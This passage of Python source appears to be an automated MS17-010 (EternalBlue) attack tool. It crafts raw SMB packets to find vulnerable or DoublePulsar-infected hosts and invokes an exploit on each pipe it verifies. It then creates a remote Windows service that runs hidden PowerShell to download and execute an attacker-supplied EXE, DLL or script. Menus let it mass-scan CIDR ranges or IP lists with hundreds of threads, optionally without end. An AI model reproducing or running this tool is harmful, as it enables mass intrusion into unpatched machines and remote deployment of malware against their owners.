			if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:
				raise e  
		else:
			scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
		
		print(" Creating Service %s..." % service_name)
		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
		serviceHandle = resp['lpServiceHandle']
		
		if serviceHandle:
			try:
				print(" Starting Service %s..." % service_name)
				scmr.hRStartServiceW(rpcsvc, serviceHandle)
				
			except Exception as e:
				print(str(e))

	except Exception as e:
		print(" ServiceExec Error on: %s" % conn.get_remote_host())
		print(str(e))
		sys.exit()
	finally:
		if svcHandle:
			scmr.hRCloseServiceHandle(rpcsvc, svcHandle)

	rpcsvc.disconnect()


def payload_opts(conn, arch):
	if pe_type=="1":
		ps_down_exec_exe(conn, arch)

	elif pe_type=="2":
		ps_down_exec_dll(conn, arch)
	elif pe_type == "3":
		InvokePoshScript(conn, arch)
	else:
		payload_opts(conn, arch)



def ps_down_exec_exe(conn, arch):
	smbConn = conn.get_smbconnection()
	ps_down = r'''cmd /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX (New-Object Net.WebClient).DownloadFile('DIRECTLINK','C:\Users\Public\STUBNAME');Start-Process C:\Users\Public\STUBNAME'''

	while 'DIRECTLINK' in ps_down:
		ps_down = ps_down.replace('DIRECTLINK', auto_url)

	while 'STUBNAME' in ps_down:
		ps_down = ps_down.replace('STUBNAME', stub_name)

	service_exec(conn, ps_down)



def ps_down_exec_dll(conn, arch):
	smbConn = conn.get_smbconnection()
	ps_down = r'''cmd /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX (New-Object Net.WebClient).DownloadFile('DIRECTLINK','C:\Users\Public\STUBNAME');regsvr32 /s C:\Users\Public\STUBNAME'''

	while 'DIRECTLINK' in ps_down:
		ps_down = ps_down.replace('DIRECTLINK', auto_url)

	while 'STUBNAME' in ps_down:
		ps_down = ps_down.replace('STUBNAME', stub_name)

	service_exec(conn, ps_down)


def InvokePoshScript(conn, arch):
	smbConn = conn.get_smbconnection()
	ps_down = r'''cmd /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX (New-Object Net.WebClient).DownloadString('DIRECTLINK')'''

	while 'DIRECTLINK' in ps_down:
		ps_down = ps_down.replace('DIRECTLINK', auto_url)

	service_exec(conn, ps_down)


logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger(__file__)


class SMB_HEADER(Structure):
	_pack_ = 1

	_fields_ = [
	("server_component", c_uint32),
	("smb_command", c_uint8),
	("error_class", c_uint8),
	("reserved1", c_uint8),
	("error_code", c_uint16),
	("flags", c_uint8),
	("flags2", c_uint16),
	("process_id_high", c_uint16),
	("signature", c_uint64),
	("reserved2", c_uint16),
	("tree_id", c_uint16),
	("process_id", c_uint16),
	("user_id", c_uint16),
	("multiplex_id", c_uint16)
	]

	def __new__(self, buffer=None):
		return self.from_buffer_copy(buffer)

	def __init__(self, buffer):
		log.debug("server_component : %04x" % self.server_component)
		log.debug("smb_command      : %01x" % self.smb_command)
		log.debug("error_class      : %01x" % self.error_class)
		log.debug("error_code       : %02x" % self.error_code)
		log.debug("flags            : %01x" % self.flags)
		log.debug("flags2           : %02x" % self.flags2)
		log.debug("process_id_high  : %02x" % self.process_id_high)
		log.debug("signature        : %08x" % self.signature)
		log.debug("reserved2        : %02x" % self.reserved2)
		log.debug("tree_id          : %02x" % self.tree_id)
		log.debug("process_id       : %02x" % self.process_id)
		log.debug("user_id          : %02x" % self.user_id)
		log.debug("multiplex_id     : %02x" % self.multiplex_id)


def generate_smb_proto_payload(*protos):
	hexdata = []
	for proto in protos:
		hexdata.extend(proto)
	return "".join(hexdata)


def calculate_doublepulsar_xor_key(s):
	x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
	x = x & 0xffffffff
	return x


def negotiate_proto_request():
	log.debug("generate negotiate request")
	netbios = [
		'\x00',
		'\x00\x00\x54'
	]

	smb_header = [
		'\xFF\x53\x4D\x42',
		'\x72',
		'\x00\x00\x00\x00',
		'\x18',
		'\x01\x28',
		'\x00\x00',
		'\x00\x00\x00\x00\x00\x00\x00\x00',
		'\x00\x00',
		'\x00\x00',
		'\x2F\x4B',
		'\x00\x00',
		'\xC5\x5E'
	]

	negotiate_proto_request = [
		'\x00',
		'\x31\x00',
		'\x02',
		'\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00',
		'\x02',
		'\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00',
		'\x02',
		'\x4E\x54\x20\x4C\x41\x4E\x4D\x41\x4E\x20\x31\x2E\x30\x00',
		'\x02',
		'\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00'
	]

	return generate_smb_proto_payload(netbios, smb_header, negotiate_proto_request)


def session_setup_andx_request():
	log.debug("generate session setup andx request")
	netbios = [
		'\x00',
		'\x00\x00\x63'
	]

	smb_header = [
		'\xFF\x53\x4D\x42',
		'\x73',
		'\x00\x00\x00\x00',
		'\x18',
		'\x01\x20',
		'\x00\x00',
		'\x00\x00\x00\x00\x00\x00\x00\x00',
		'\x00\x00',
		'\x00\x00',
		'\x2F\x4B',
		'\x00\x00',
		'\xC5\x5E'
	]

	session_setup_andx_request = [
		'\x0D',
		'\xFF',
		'\x00',
		'\x00\x00',
		'\xDF\xFF',
		'\x02\x00',
		'\x01\x00',
		'\x00\x00\x00\x00',
		'\x00\x00',
		'\x00\x00',
		'\x00\x00\x00\x00',
		'\x40\x00\x00\x00',
		'\x26\x00',
		'\x00',
		'\x2e\x00',
		'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00',
		'\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00',
	]

	return generate_smb_proto_payload(netbios, smb_header, session_setup_andx_request)


def tree_connect_andx_request(ip, userid):
	log.debug("generate tree connect andx request")

	netbios = [
		'\x00',
		'\x00\x00\x47'
	]

	smb_header = [
		'\xFF\x53\x4D\x42',
		'\x75',
		'\x00\x00\x00\x00',
		'\x18',
		'\x01\x20',
		'\x00\x00',
		'\x00\x00\x00\x00\x00\x00\x00\x00',
		'\x00\x00',
		'\x00\x00',
		'\x2F\x4B',
		userid,
		'\xC5\x5E'
	]

	ipc = "\\\\{}\IPC$\x00".format(ip)
	log.debug("Connecting to {} with UID = {}".format(ipc, userid))

	tree_connect_andx_request = [
		'\x04',
		'\xFF',
		'\x00',
		'\x00\x00',
		'\x00\x00',
		'\x01\x00',
		'\x1A\x00',
		'\x00',
		ipc.encode(),
		'\x3f\x3f\x3f\x3f\x3f\x00'
	]

	length = len("".join(smb_header)) + len("".join(tree_connect_andx_request))

	netbios[1] = struct.pack(">L", length)[-3:]

	return generate_smb_proto_payload(netbios, smb_header, tree_connect_andx_request)


def peeknamedpipe_request(treeid, processid, userid, multiplex_id):

	log.debug("generate peeknamedpipe request")
	netbios = [
		'\x00',
		'\x00\x00\x4a'
	]

	smb_header = [
		'\xFF\x53\x4D\x42',
		'\x25',
		'\x00\x00\x00\x00',
		'\x18',
		'\x01\x28',
		'\x00\x00',
		'\x00\x00\x00\x00\x00\x00\x00\x00',
		'\x00\x00',
		treeid,
		processid,
		userid,
		multiplex_id
	]

	tran_request = [
		'\x10',
		'\x00\x00',
		'\x00\x00',
		'\xff\xff',
		'\xff\xff',
		'\x00',
		'\x00',
		'\x00\x00',
		'\x00\x00\x00\x00',
		'\x00\x00',
		'\x00\x00',
		'\x4a\x00',
		'\x00\x00',
		'\x4a\x00',
		'\x02',
		'\x00',
		'\x23\x00',
		'\x00\x00',
		'\x07\x00',
		'\x5c\x50\x49\x50\x45\x5c\x00'
	]

	return generate_smb_proto_payload(netbios, smb_header, tran_request)


def trans2_request(treeid, processid, userid, multiplex_id):
	
	log.debug("generate tran2 request")
	netbios = [
		'\x00',
		'\x00\x00\x4f'
	]

	smb_header = [
		'\xFF\x53\x4D\x42',
		'\x32',
		'\x00\x00\x00\x00',
		'\x18',
		'\x07\xc0',
		'\x00\x00',
		'\x00\x00\x00\x00\x00\x00\x00\x00',
		'\x00\x00',
		treeid,
		processid,
		userid,
		multiplex_id
	]

	trans2_request = [
		'\x0f',
		'\x0c\x00',
		'\x00\x00',
		'\x01\x00',
		'\x00\x00',
		'\x00',
		'\x00',
		'\x00\x00',
		'\xa6\xd9\xa4\x00',
		'\x00\x00',
		'\x0c\x00',
		'\x42\x00',
		'\x00\x00',
		'\x4e\x00',
		'\x01',
		'\x00',
		'\x0e\x00',
		'\x00\x00',
		'\x0c\x00' + '\x00' * 12
	]

	return generate_smb_proto_payload(netbios, smb_header, trans2_request)

def check_445(ip, port=445):
	try:
		buffersize = 1024
		timeout = 5.0

		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(timeout)
		client.connect((ip, port))

		raw_proto = negotiate_proto_request()
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		raw_proto = session_setup_andx_request()
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		user_id = struct.pack('<H', smb.user_id)

		session_setup_andx_response = tcp_response[36:]
		native_os = session_setup_andx_response[9:].split('\x00')[0]

		raw_proto = tree_connect_andx_request(ip, user_id)
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		tree_id = struct.pack('<H', smb.tree_id)
		process_id = struct.pack('<H', smb.process_id)
		user_id = struct.pack('<H', smb.user_id)
		multiplex_id = struct.pack('<H', smb.multiplex_id)

		raw_proto = peeknamedpipe_request(tree_id, process_id, user_id, multiplex_id)
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		nt_status = struct.pack('BBH', smb.error_class, smb.reserved1, smb.error_code)

		if nt_status == '\x05\x02\x00\xc0':
			log.info("[+] [{}:{}] is likely VULNERABLE to MS17-010! ({})".format(ip, port, native_os))

			raw_proto = trans2_request(tree_id, process_id, user_id, multiplex_id)
			client.send(raw_proto)
			tcp_response = client.recv(buffersize)

			netbios = tcp_response[:4]
			smb_header = tcp_response[4:36]
			smb = SMB_HEADER(smb_header)

			print(" Vulnerable host found :: Creating new thread to verify pipe names...")
			verify_pipe(ip)


			if smb.multiplex_id == 0x0051:
				key = calculate_doublepulsar_xor_key(smb.signature)
				log.info("Host is likely INFECTED with DoublePulsar! - XOR Key: {}".format(key))
				print(" Vulnerable host found :: Creating new thread to verify pipe names...")
				verify_pipe(ip)
		elif nt_status in ('\x08\x00\x00\xc0', '\x22\x00\x00\xc0'):
			log.info("[-] [{}:{}] does NOT appear vulnerable".format(ip, port))
			client.close()
			sys.exit()
		else:
			log.info("[-] [{}:{}] Unable to detect if this host is vulnerable".format(ip, port))
			client.close()
			sys.exit()

	except Exception as err:
		log.error("[-] [{}:{}] Exception: {}".format(ip, port, err))
		sys.exit()
	finally:
		client.close()


def check_139(ip, port=139):
	try:
		buffersize = 1024
		timeout = 5.0

		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(timeout)
		client.connect((ip, port))

		raw_proto = negotiate_proto_request()
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		raw_proto = session_setup_andx_request()
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		user_id = struct.pack('<H', smb.user_id)

		session_setup_andx_response = tcp_response[36:]
		native_os = session_setup_andx_response[9:].split('\x00')[0]

		raw_proto = tree_connect_andx_request(ip, user_id)
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		tree_id = struct.pack('<H', smb.tree_id)
		process_id = struct.pack('<H', smb.process_id)
		user_id = struct.pack('<H', smb.user_id)
		multiplex_id = struct.pack('<H', smb.multiplex_id)

		raw_proto = peeknamedpipe_request(tree_id, process_id, user_id, multiplex_id)
		client.send(raw_proto)
		tcp_response = client.recv(buffersize)

		netbios = tcp_response[:4]
		smb_header = tcp_response[4:36]
		smb = SMB_HEADER(smb_header)

		nt_status = struct.pack('BBH', smb.error_class, smb.reserved1, smb.error_code)

		if nt_status == '\x05\x02\x00\xc0':
			log.info("[+] [{}:{}] is likely VULNERABLE to MS17-010! ({})".format(ip, port, native_os))

			raw_proto = trans2_request(tree_id, process_id, user_id, multiplex_id)
			client.send(raw_proto)
			tcp_response = client.recv(buffersize)

			netbios = tcp_response[:4]
			smb_header = tcp_response[4:36]
			smb = SMB_HEADER(smb_header)
			verify_pipe(ip)

			if smb.multiplex_id == 0x0051:
			  key = calculate_doublepulsar_xor_key(smb.signature)
			  log.info("Host is likely INFECTED with DoublePulsar! - XOR Key: {}".format(key))
			  verify_pipe(ip)
		elif nt_status in ('\x08\x00\x00\xc0', '\x22\x00\x00\xc0'):
			log.info("[-] [{}:{}] does NOT appear vulnerable".format(ip, port))
		else:
			log.info("[-] [{}:{}] Unable to detect if this host is vulnerable".format(ip, port))

	except Exception as err:
		log.error("[-] [{}:{}] Exception: {}".format(ip, port, err))
		sys.exit()
	finally:
		client.close()


def verify_pipe(ip):
	NDR64Syntax = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')

	MSRPC_UUID_BROWSER  = uuidtup_to_bin(('6BFFD098-A112-3610-9833-012892020162','0.0'))
	MSRPC_UUID_SPOOLSS  = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB','1.0'))
	MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB','1.0'))
	MSRPC_UUID_LSARPC   = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AB','0.0'))
	MSRPC_UUID_SAMR     = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AC','1.0'))

	pipes = {
		'browser'  : MSRPC_UUID_BROWSER,
		'spoolss'  : MSRPC_UUID_SPOOLSS,
		'netlogon' : MSRPC_UUID_NETLOGON,
		'lsarpc'   : MSRPC_UUID_LSARPC,
		'samr'     : MSRPC_UUID_SAMR,
	}

	target = ip

	conn = MYSMB(target)
	try:
		conn.login(USERNAME, PASSWORD)
	except smb.SessionError as e:
		print(" Login Failed: " + nt_errors.ERROR_MESSAGES[e.error_code][0])
	finally:
		print(" Target OS: " + conn.get_server_os())

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	conn.set_default_tid(tid)


	
	TRANS_PEEK_NMPIPE = 0x23
	recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
	status = recvPkt.getNTStatus()
	if status == 0xC0000205:  
		print(" The Target's OS is not patched")
		
	else:
		print(" The Target's OS is patched")
		


	print("")
	print(" ----- Verifying SMB Pipe Names ----- ")
	print("")
	for pipe_name, pipe_uuid in pipes.items():
		try:
			dce = conn.get_dce_rpc(pipe_name)
			dce.connect()
			try:
				dce.bind(pipe_uuid, transfer_syntax=NDR64Syntax)
				print(" SMB Pipe Name :: {} :: OK! (64 BIT)".format(pipe_name))
				print(" Exploit Mode Starts Here with {}".format(pipe_name))
				exploit(target, pipe_name)
				break
			except DCERPCException as e:
				if 'transfer_syntaxes_not_supported' in str(e):
					print(" SMB Pipe Name :: {} :: OK! (32 BIT)".format(pipe_name))
					print(" Exploit Mode Starts Here with {}".format(pipe_name))
					exploit(target, pipe_name)
				else:
					print(" SMB Pipe Name :: {} :: OK! ({})".format(pipe_name, str(e)))
			dce.disconnect()
		except smb.SessionError as e:
			print(" SMB Pipe Name :: {} :: {}".format(pipe_name, nt_errors.ERROR_MESSAGES[e.error_code][0]))
		except smbconnection.SessionError as e:
			print(" SMB Pipe Name :: {} :: {}".format(pipe_name, nt_errors.ERROR_MESSAGES[e.error][0]))


	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()
	#sys.exit()


class T445:
	def __init__(self):
		pass

	def run(self):
		global q
		q.put(check_445(str(ip)))


class T139:
	def __init__(self):
		pass

	def run(self):
		global q
		q.put(check_139(str(ip)))


def cls():
	os.system('cls' if os.name=='nt' else 'clear')


def MainMenu():
	cls()
	print(banner)
	print("")
	print("---------- Main Menu ----------")
	print("")
	print(" 1. Scan CIDR Range")
	print(" 2. Scan Custom List")
	print(" 3. Exit")
	print("")
	mainChoice = input(" Choose an option: ")

	if mainChoice == 1:
		global cidrInput
		cidrInput = raw_input(" CIDR Range to scan: ")
		PayloadMenu(1)
	elif mainChoice == 2:
		global customList
		customList = raw_input(" Filename to scan from: ")
		PayloadMenu(2)
	elif mainChoice == 3:
		sys.exit(1)
	else:
		MainMenu()
	

def PayloadMenu(scanType):
	cls()
	print(banner)
	print("")
	print("---------- Payload Menu -----------")
	print("")
	print(" 1. Download & Execute (EXE)")
	print(" 2. Download & Execute (DLL)")
	print(" 3. Invoke-PoshScript (PS1)")
	print(" 4. Exit")
	print("")

	global pe_type
	pe_type = raw_input(" Please choose an option: ")
	
	global auto_url 
	auto_url = raw_input(" Payload Direct URL: ")
	
	global stub_name
	stub_name = raw_input(" Payload Name: ")

	print("")
	print(" Scan Mode 1: Scan entire IP list (Exit On Finish).")
	print(" Scan Mode 2: Scan entire IP list (Non-Stop Scan).")
	global scanMethod
	scanMethod = raw_input(" Choose Scan Mode: ")
	if scanMethod == "1":
		scanMethod = 1
	elif scanMethod == "2":
		scanMethod = 2
	else:
		scanMethod = 1

	StartSMB_Scan(scanType, scanMethod)


def StartSMB_Scan(scanType, scanMethod):
	global q
	global ip
	global threads
	global maxThreads
	maxThreads = 250
	q = Queue.Queue(10)
	threads = []
	if scanType == 1:
		cidrSource = unicode(cidrInput)
		cidrNet = ipaddress.ip_network(cidrSource)
		if scanMethod == 1:
			for ip in cidrNet:
				p = T445()
				c = T139()
				pt = threading.Thread(target=p.run, args=())
				ct = threading.Thread(target=c.run, args=())
				threads.append(pt)
				threads.append(ct)
				threadCnt = threading.active_count()
				sleep(0.1)
				pt.start()
				ct.start()
				if threadCnt > maxThreads:
					for thread in threads:
						thread.join()
		elif scanMethod == 2:
			intConst = 0x314B
			while intConst == 0x314B:
				intConst = 0x314B
				for ip in cidrNet:
					p = T445()
					c = T139()
					pt = threading.Thread(target=p.run, args=())
					ct = threading.Thread(target=c.run, args=())
					threads.append(pt)
					threads.append(ct)
					threadCnt = threading.active_count()
					sleep(0.1)
					pt.start()
					ct.start()
					if threadCnt > maxThreads:
						for thread in threads:
							thread.join()
				time.sleep(30)
				# And the snake eats its tail...
				StartSMB_Scan(scanType, scanMethod)
	elif scanType == 2:
		scanSource = customList
		if scanMethod == 1:
			with open(scanSource, 'r') as cidrList:
				cidrNet = cidrList.read().split("\n")
				for lineIP in cidrNet:
					ipRegex = re.findall(r'(?:(?:1\d\d|2[0-5][0-5]|2[0-4]\d|0?[1-9]\d|0?0?\d)\.){3}(?:1\d\d|2[0-5][0-5]|2[0-4]\d|0?[1-9]\d|0?0?\d)', lineIP)
					for ip in ipRegex:
						p = T445()
						c = T139()
						pt = threading.Thread(target=p.run, args=())
						ct = threading.Thread(target=c.run, args=())
						threads.append(pt)
						threads.append(ct)
						threadCnt = threading.active_count()
						sleep(0.1)
						pt.start()
						ct.start()
						if threadCnt > maxThreads:
							for thread in threads:
								thread.join()
		elif scanMethod == 2:
			intConst = 0x314B
			while intConst == 0x314B:
				intConst = 0x314B
				with open(scanSource, 'r') as cidrList:
					cidrNet = cidrList.read().split("\n")
					for lineIP in cidrNet:
						ipRegex = re.findall(r'(?:(?:1\d\d|2[0-5][0-5]|2[0-4]\d|0?[1-9]\d|0?0?\d)\.){3}(?:1\d\d|2[0-5][0-5]|2[0-4]\d|0?[1-9]\d|0?0?\d)', lineIP)
						for ip in ipRegex:
							p = T445()
							c = T139()
							pt = threading.Thread(target=p.run, args=())
							ct = threading.Thread(target=c.run, args=())
							threads.append(pt)
							threads.append(ct)
							threadCnt = threading.active_count()
							sleep(0.1)
							pt.start()
							ct.start()
							if threadCnt > maxThreads:
								for thread in threads:
									thread.join()
				time.sleep(30)
				# And the snake eats its tail...
				StartSMB_Scan(scanType, scanMethod)


MainMenu()